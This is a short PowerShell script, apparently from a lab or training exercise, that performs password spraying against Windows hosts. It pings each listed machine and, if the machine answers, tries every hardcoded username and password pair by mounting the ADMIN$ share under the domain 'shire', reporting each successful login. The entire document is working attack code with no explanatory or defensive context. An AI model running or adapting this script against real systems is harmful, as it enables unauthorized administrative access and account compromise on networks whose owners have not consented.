function spray {
    $users = @("pgustavo","lrodriguez","mmidge")
    $computers = @("IT001","ACCT001", "HFDC01")
    $passwords = @("Password123","W1n1!19","Luch0!","Hunt1ng!","P3dr0Dulc3!")
    ForEach ($computer in $computers) {
        if (Test-Connection -BufferSize 32 -Count 1 -ComputerName $computer -Quiet) {
            "$computer is Up"
        }
        else{
            continue         
        }
        foreach ($user in $users ) {
            foreach ($password in $passwords) {
                write-host "[*] Trying $user : $password on $computer"
                if (net use \\$computer\ADMIN$ /user:shire\$user $password) {
                    "[*] Successful mount with: $user : $password on $computer"
                    net use /delete \\$computer\ADMIN$
                }
                else {
                    continue
                }
            }
        }
    }
}